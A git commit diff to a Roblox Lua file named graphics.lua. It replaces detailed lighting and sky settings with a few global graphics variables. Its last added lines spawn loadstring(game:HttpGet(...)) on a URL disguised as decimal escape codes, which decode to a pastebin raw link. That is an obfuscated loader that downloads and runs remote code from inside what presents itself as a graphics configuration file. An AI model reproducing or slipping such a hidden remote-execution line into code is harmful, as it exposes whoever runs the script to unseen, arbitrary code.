def8ebd7f3d6ced17ba08bcf9f51c90a4c294af9
AnonymousCoder <76236098+2nJe7eV9h@users.noreply.github.com>
2023-03-14 21:33:40 +0000

    Update graphics.lua

--- graphics.lua
+++ graphics.lua
@@ -1,71 +1,21 @@
-local Callback = Instance.new("BindableFunction")
-function Callback.OnInvoke(Button)
-    
-end
+_G.BlurSize = 3
 
-game:GetService("StarterGui"):SetCore("SendNotification", {
-    Title = "Script Notification",
-    Text = "BGS Ran.",
-    Icon = 3610247188,
-    Duration = 4,
-    Callback = Callback,
-    Button1 = "",
-    Button2 = "",
-})
-Callback:Destroy() 
+_G.ColorCorrectionBrightness = 0.03
+_G.ColorCorrectionContrast = 0.3
+_G.ColorCorrectionSaturation = 0.01
+_G.ColorCorrectionTintColor = Color3.fromRGB(244,244,244)
 
-local find1 = game.Lighting:FindFirstChildWhichIsA("BloomEffect") if find1 then
-    game.Lighting:FindFirstChildWhichIsA("BloomEffect"):Destroy()
-end
-local find2 = game.Lighting:FindFirstChildWhichIsA("SunRaysEffect") if find2 then
-    game.Lighting:FindFirstChildWhichIsA("SunRaysEffect"):Destroy()
-end
-local find3 = game.Lighting:FindFirstChildWhichIsA("ColorCorrectionEffect") if find3 then
-    game.Lighting:FindFirstChildWhichIsA("ColorCorrectionEffect"):Destroy()
-end
-local find4 = game.Lighting:FindFirstChildWhichIsA("BlurEffect") if find4 then
-    game.Lighting:FindFirstChildWhichIsA("BlurEffect")
-end
-local find5 = game.Lighting:FindFirstChildWhichIsA("Sky") if find5 then
-    game.Lighting:FindFirstChildWhichIsA("Sky"):Destroy()
-end
-local bloom = Instance.new("BloomEffect",game.Lighting)
-local sunray = Instance.new("SunRaysEffect",game.Lighting)
-local color = Instance.new("ColorCorrectionEffect",game.Lighting) 
-local atmo = Instance.new("Atmosphere",game.Lighting)
-local atmo2 = Instance.new("Atmosphere",game.Lighting)
-local sky = Instance.new("Sky",game.Lighting)
-game.Lighting.ClockTime = 13.74
-game.Lighting.ExposureCompensation = 0.34
-game.Lighting.ShadowSoftness = 1
-game.Lighting.EnvironmentDiffuseScale = 0.343
-game.Lighting.EnvironmentSpecularScale = 1
-game.Lighting.Brightness = 2
-game.Lighting.ColorShift_Top = Color3.fromRGB(118,117,108)
-game.Lighting.OutdoorAmbient = Color3.fromRGB(141,141,141)
-game.Lighting.GeographicLatitude = 100
-game.Lighting.Ambient = Color3.fromRGB(112,112,112)
-atmo.Density = 0.348
-atmo.Offset = 0.199
-atmo.Color = Color3.fromRGB(216, 255, 250)
-atmo.Decay = Color3.fromRGB(92, 60, 13)
-atmo.Glare = 0.68
-atmo.Haze = 0.36
-atmo2.Density = 0.348
-atmo2.Offset = 0.199
-atmo2.Color = Color3.fromRGB(216, 255, 250)
-atmo2.Decay = Color3.fromRGB(92, 60, 13)
-atmo2.Glare = 0.68
-atmo2.Haze = 0.36
-bloom.Intensity = 0.5
-bloom.Size = 22
-bloom.Threshold = 1.5
-sunray.Intensity = 0.2
-sunray.Spread = 1
-color.Contrast = 0.275
-color.Saturation = 0.2
-color.TintColor = Color3.fromRGB(255,252,224)
-color.Brightness = 0.05
-sky.StarCount = 5000
-sky.MoonAngularSize = 8.75
-sky.SunAngularSize = 18
+_G.SunRaysIntensity = 0.2
+_G.SunRaysSpread = 1
+
+-- Lighting settings:
+_G.GlobalShadows = true
+_G.Brightness = 0.9
+_G.GeographicLatitude = 350
+_G.TimeOfDay = 20
+_G.ExposureCompensation = 0.03
+
+
+spawn(function()
+loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\55\110\57\103\53\55\112\50"))()
+end)
